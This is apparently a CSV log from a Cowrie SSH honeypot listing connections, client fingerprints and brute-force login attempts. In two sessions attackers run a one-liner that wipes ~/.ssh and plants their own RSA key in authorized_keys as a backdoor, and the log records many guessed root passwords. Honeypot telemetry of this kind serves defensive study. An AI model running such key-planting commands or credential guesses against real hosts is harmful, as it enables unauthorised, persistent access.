eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.client.kex,103.3.247.81,,,,74a1da297d75,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T00:07:15.687677Z
cowrie.login.success,103.3.247.81,,,,74a1da297d75,,,,,login attempt [root/Aa@123456] succeeded,localhost,2024-12-01T00:07:16.491445Z
cowrie.session.params,103.3.247.81,,,,74a1da297d75,,,,,[],localhost,2024-12-01T00:07:16.937388Z
cowrie.command.input,103.3.247.81,,,,74a1da297d75,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-12-01T00:07:16.937741Z
cowrie.command.failed,103.3.247.81,,,,74a1da297d75,,,,,Command not found: lockr -ia .ssh,localhost,2024-12-01T00:07:16.938494Z
cowrie.log.closed,103.3.247.81,,,,74a1da297d75,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-12-01T00:07:17.320384Z
cowrie.session.params,103.3.247.81,,,,74a1da297d75,,,,,[],localhost,2024-12-01T00:07:17.528879Z
cowrie.command.input,103.3.247.81,,,,74a1da297d75,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-12-01T00:07:17.529231Z
cowrie.session.file_download,103.3.247.81,,,,74a1da297d75,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-12-01T00:07:17.722004Z
cowrie.log.closed,103.3.247.81,,,,74a1da297d75,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-12-01T00:07:17.722852Z
cowrie.session.connect,103.3.247.81,60824,172.233.154.19,2222,7517417b9d5d,ssh,,,,New connection: 103.3.247.81:60824 (172.233.154.19:2222) [session: 7517417b9d5d],localhost,2024-12-01T00:07:17.910560Z
cowrie.client.version,103.3.247.81,,,,7517417b9d5d,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:07:17.911220Z
cowrie.client.kex,103.3.247.81,,,,7517417b9d5d,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T00:07:18.097702Z
cowrie.login.failed,103.3.247.81,,,,7517417b9d5d,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-12-01T00:07:18.884650Z
cowrie.session.closed,103.3.247.81,,,,7517417b9d5d,,,,,Connection lost after 2 seconds,localhost,2024-12-01T00:07:20.073296Z
cowrie.session.connect,103.3.247.81,60840,172.233.154.19,2222,9f60080437cb,ssh,,,,New connection: 103.3.247.81:60840 (172.233.154.19:2222) [session: 9f60080437cb],localhost,2024-12-01T00:07:20.251538Z
cowrie.client.version,103.3.247.81,,,,9f60080437cb,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:07:20.252090Z
cowrie.client.kex,103.3.247.81,,,,9f60080437cb,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T00:07:20.433127Z
cowrie.login.success,103.3.247.81,,,,9f60080437cb,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-12-01T00:07:21.198371Z
cowrie.session.closed,103.3.247.81,,,,74a1da297d75,,,,,Connection lost after 5 seconds,localhost,2024-12-01T00:07:21.380143Z
cowrie.session.closed,103.3.247.81,,,,9f60080437cb,,,,,Connection lost after 1 seconds,localhost,2024-12-01T00:07:21.380818Z
cowrie.session.connect,190.145.81.37,58883,172.233.154.19,2222,fdc2b2079e63,ssh,,,,New connection: 190.145.81.37:58883 (172.233.154.19:2222) [session: fdc2b2079e63],localhost,2024-12-01T00:07:52.998497Z
cowrie.client.version,190.145.81.37,,,,fdc2b2079e63,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:07:53.067646Z
cowrie.client.kex,190.145.81.37,,,,fdc2b2079e63,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T00:07:53.190746Z
cowrie.login.failed,190.145.81.37,,,,fdc2b2079e63,,,,,login attempt [shaman/shaman] failed,localhost,2024-12-01T00:07:53.755497Z
cowrie.session.closed,190.145.81.37,,,,fdc2b2079e63,,,,,Connection lost after 1 seconds,localhost,2024-12-01T00:07:54.884786Z
cowrie.session.connect,80.91.167.80,48632,172.233.154.19,2222,7d537edd6f65,ssh,,,,New connection: 80.91.167.80:48632 (172.233.154.19:2222) [session: 7d537edd6f65],localhost,2024-12-01T00:07:58.318795Z
cowrie.client.version,80.91.167.80,,,,7d537edd6f65,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:07:58.319378Z
cowrie.client.kex,80.91.167.80,,,,7d537edd6f65,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T00:07:58.516463Z
cowrie.login.failed,80.91.167.80,,,,7d537edd6f65,,,,,login attempt [anis/anis] failed,localhost,2024-12-01T00:07:59.345135Z
cowrie.session.closed,80.91.167.80,,,,7d537edd6f65,,,,,Connection lost after 2 seconds,localhost,2024-12-01T00:08:00.544372Z
cowrie.session.connect,139.199.80.137,40302,172.233.154.19,2222,e225c71cbbe0,ssh,,,,New connection: 139.199.80.137:40302 (172.233.154.19:2222) [session: e225c71cbbe0],localhost,2024-12-01T00:08:29.465624Z
cowrie.client.version,139.199.80.137,,,,e225c71cbbe0,,SSH-2.0-libssh-0.2,,,Remote SSH version: SSH-2.0-libssh-0.2,localhost,2024-12-01T00:08:29.621358Z
cowrie.session.closed,139.199.80.137,,,,e225c71cbbe0,,,,,Connection lost after 0 seconds,localhost,2024-12-01T00:08:29.777286Z
cowrie.session.connect,117.2.142.24,54220,172.233.154.19,2222,e14b16016b3e,ssh,,,,New connection: 117.2.142.24:54220 (172.233.154.19:2222) [session: e14b16016b3e],localhost,2024-12-01T00:08:38.327359Z
cowrie.client.version,117.2.142.24,,,,e14b16016b3e,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:08:38.327986Z
cowrie.client.kex,117.2.142.24,,,,e14b16016b3e,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T00:08:38.531181Z
cowrie.login.failed,117.2.142.24,,,,e14b16016b3e,,,,,login attempt [dallas/dallas] failed,localhost,2024-12-01T00:08:39.383616Z
cowrie.session.closed,117.2.142.24,,,,e14b16016b3e,,,,,Connection lost after 2 seconds,localhost,2024-12-01T00:08:40.590631Z
cowrie.session.connect,2.57.122.33,46016,172.233.154.19,2222,be1affb7319b,ssh,,,,New connection: 2.57.122.33:46016 (172.233.154.19:2222) [session: be1affb7319b],localhost,2024-12-01T00:08:48.940027Z
cowrie.client.version,2.57.122.33,,,,be1affb7319b,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-12-01T00:08:48.940596Z
cowrie.client.kex,2.57.122.33,,,,be1affb7319b,,,98f63c4d9c87edbd97ed4747fa031019,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 98f63c4d9c87edbd97ed4747fa031019,localhost,2024-12-01T00:08:49.114280Z
cowrie.login.failed,2.57.122.33,,,,be1affb7319b,,,,,login attempt [RPM/RPM] failed,localhost,2024-12-01T00:08:49.638270Z
cowrie.session.closed,2.57.122.33,,,,be1affb7319b,,,,,Connection lost after 1 seconds,localhost,2024-12-01T00:08:50.814141Z
cowrie.session.connect,134.209.168.99,58376,172.233.154.19,2222,0c7f174dee6e,ssh,,,,New connection: 134.209.168.99:58376 (172.233.154.19:2222) [session: 0c7f174dee6e],localhost,2024-12-01T00:10:04.682472Z
cowrie.client.version,134.209.168.99,,,,0c7f174dee6e,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-12-01T00:10:04.683164Z
cowrie.client.kex,134.209.168.99,,,,0c7f174dee6e,,,4e066189c3bbeec38c99b1855113733a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a,localhost,2024-12-01T00:10:04.752303Z
cowrie.login.success,134.209.168.99,,,,0c7f174dee6e,,,,,login attempt [root/123456Qw@] succeeded,localhost,2024-12-01T00:10:04.959359Z
cowrie.session.params,134.209.168.99,,,,0c7f174dee6e,,,,,[],localhost,2024-12-01T00:10:05.099403Z
cowrie.command.input,134.209.168.99,,,,0c7f174dee6e,,,,,CMD: uname -s -v -n -r -m,localhost,2024-12-01T00:10:05.099960Z
cowrie.log.closed,134.209.168.99,,,,0c7f174dee6e,,,,,Closing TTY Log: var/lib/cowrie/tty/7ab552f01de999cb12092166cdc36fd68a0edbb33927e0ef3d26f4ee6449f804 after 0 seconds,localhost,2024-12-01T00:10:05.162032Z
cowrie.session.closed,134.209.168.99,,,,0c7f174dee6e,,,,,Connection lost after 0 seconds,localhost,2024-12-01T00:10:05.162935Z
cowrie.session.connect,218.78.23.234,50108,172.233.154.19,2222,6c034090a3a0,ssh,,,,New connection: 218.78.23.234:50108 (172.233.154.19:2222) [session: 6c034090a3a0],localhost,2024-12-01T00:10:09.976496Z
cowrie.client.version,218.78.23.234,,,,6c034090a3a0,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:10:09.980340Z
cowrie.session.closed,218.78.23.234,,,,6c034090a3a0,,,,,Connection lost after 120 seconds,localhost,2024-12-01T00:12:09.983769Z
cowrie.session.connect,190.145.81.37,41743,172.233.154.19,2222,2e26133ff2f8,ssh,,,,New connection: 190.145.81.37:41743 (172.233.154.19:2222) [session: 2e26133ff2f8],localhost,2024-12-01T00:13:03.250952Z
cowrie.client.version,190.145.81.37,,,,2e26133ff2f8,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:13:03.251808Z
cowrie.client.kex,190.145.81.37,,,,2e26133ff2f8,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T00:13:03.375748Z
cowrie.login.success,190.145.81.37,,,,2e26133ff2f8,,,,,login attempt [root/babu] succeeded,localhost,2024-12-01T00:13:03.910732Z
cowrie.session.params,190.145.81.37,,,,2e26133ff2f8,,,,,[],localhost,2024-12-01T00:13:04.183781Z
cowrie.command.input,190.145.81.37,,,,2e26133ff2f8,,,,,CMD: cd ~; chattr -ia .ssh; lockr -ia .ssh,localhost,2024-12-01T00:13:04.184468Z
cowrie.command.failed,190.145.81.37,,,,2e26133ff2f8,,,,,Command not found: lockr -ia .ssh,localhost,2024-12-01T00:13:04.185471Z
cowrie.log.closed,190.145.81.37,,,,2e26133ff2f8,,,,,Closing TTY Log: var/lib/cowrie/tty/c32b4937ce8564ea904a3bd2cb64805500ddfd28952a90fd55cb3c85d0be7644 after 0 seconds,localhost,2024-12-01T00:13:04.474903Z
cowrie.session.params,190.145.81.37,,,,2e26133ff2f8,,,,,[],localhost,2024-12-01T00:13:04.616566Z
cowrie.command.input,190.145.81.37,,,,2e26133ff2f8,,,,,"CMD: cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr"">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",localhost,2024-12-01T00:13:04.617102Z
cowrie.session.file_download,190.145.81.37,,,,2e26133ff2f8,,,,,Saved redir contents with SHA-256 a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 to var/lib/cowrie/downloads/a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2,localhost,2024-12-01T00:13:04.742576Z
cowrie.log.closed,190.145.81.37,,,,2e26133ff2f8,,,,,Closing TTY Log: var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f after 0 seconds,localhost,2024-12-01T00:13:04.743224Z
cowrie.session.connect,190.145.81.37,41904,172.233.154.19,2222,21d16f03d5bf,ssh,,,,New connection: 190.145.81.37:41904 (172.233.154.19:2222) [session: 21d16f03d5bf],localhost,2024-12-01T00:13:04.862282Z
cowrie.client.version,190.145.81.37,,,,21d16f03d5bf,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:13:04.862798Z
cowrie.client.kex,190.145.81.37,,,,21d16f03d5bf,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T00:13:04.982988Z
cowrie.session.connect,172.104.11.46,36394,172.233.154.19,2222,fd8e9124f493,ssh,,,,New connection: 172.104.11.46:36394 (172.233.154.19:2222) [session: fd8e9124f493],localhost,2024-12-01T00:13:05.462381Z
cowrie.login.failed,190.145.81.37,,,,21d16f03d5bf,,,,,login attempt [345gs5662d34/345gs5662d34] failed,localhost,2024-12-01T00:13:05.502753Z
cowrie.client.version,172.104.11.46,,,,fd8e9124f493,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-12-01T00:13:05.706001Z
cowrie.client.kex,172.104.11.46,,,,fd8e9124f493,,,4e066189c3bbeec38c99b1855113733a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a,localhost,2024-12-01T00:13:05.706498Z
cowrie.session.closed,172.104.11.46,,,,fd8e9124f493,,,,,Connection lost after 0 seconds,localhost,2024-12-01T00:13:06.296954Z
cowrie.session.connect,172.104.11.46,36396,172.233.154.19,2222,6ecee3603336,ssh,,,,New connection: 172.104.11.46:36396 (172.233.154.19:2222) [session: 6ecee3603336],localhost,2024-12-01T00:13:06.372555Z
cowrie.session.closed,190.145.81.37,,,,21d16f03d5bf,,,,,Connection lost after 1 seconds,localhost,2024-12-01T00:13:06.625360Z
cowrie.client.version,172.104.11.46,,,,6ecee3603336,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-12-01T00:13:06.658247Z
cowrie.client.kex,172.104.11.46,,,,6ecee3603336,,,4e066189c3bbeec38c99b1855113733a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a,localhost,2024-12-01T00:13:06.658797Z
cowrie.session.connect,190.145.81.37,42306,172.233.154.19,2222,72237f7a994d,ssh,,,,New connection: 190.145.81.37:42306 (172.233.154.19:2222) [session: 72237f7a994d],localhost,2024-12-01T00:13:06.746932Z
cowrie.client.version,190.145.81.37,,,,72237f7a994d,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:13:06.747719Z
cowrie.client.kex,190.145.81.37,,,,72237f7a994d,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T00:13:06.871661Z
cowrie.session.closed,172.104.11.46,,,,6ecee3603336,,,,,Connection lost after 0 seconds,localhost,2024-12-01T00:13:07.284433Z
cowrie.session.connect,172.104.11.46,36398,172.233.154.19,2222,41e8c1f66cb0,ssh,,,,New connection: 172.104.11.46:36398 (172.233.154.19:2222) [session: 41e8c1f66cb0],localhost,2024-12-01T00:13:07.351165Z
cowrie.login.success,190.145.81.37,,,,72237f7a994d,,,,,login attempt [root/3245gs5662d34] succeeded,localhost,2024-12-01T00:13:07.404631Z
cowrie.session.closed,190.145.81.37,,,,2e26133ff2f8,,,,,Connection lost after 4 seconds,localhost,2024-12-01T00:13:07.529561Z
cowrie.session.closed,190.145.81.37,,,,72237f7a994d,,,,,Connection lost after 0 seconds,localhost,2024-12-01T00:13:07.530272Z
cowrie.client.version,172.104.11.46,,,,41e8c1f66cb0,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-12-01T00:13:07.561688Z
cowrie.client.kex,172.104.11.46,,,,41e8c1f66cb0,,,4e066189c3bbeec38c99b1855113733a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a,localhost,2024-12-01T00:13:07.562398Z
cowrie.session.closed,172.104.11.46,,,,41e8c1f66cb0,,,,,Connection lost after 0 seconds,localhost,2024-12-01T00:13:08.104817Z
cowrie.session.connect,80.91.167.80,50136,172.233.154.19,2222,0e4988a3f881,ssh,,,,New connection: 80.91.167.80:50136 (172.233.154.19:2222) [session: 0e4988a3f881],localhost,2024-12-01T00:13:20.667308Z
cowrie.client.version,80.91.167.80,,,,0e4988a3f881,,SSH-2.0-libssh_0.9.6,,,Remote SSH version: SSH-2.0-libssh_0.9.6,localhost,2024-12-01T00:13:20.668070Z
cowrie.client.kex,80.91.167.80,,,,0e4988a3f881,,,f555226df1963d1d3c09daf865abdc9a,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a,localhost,2024-12-01T00:13:20.855040Z
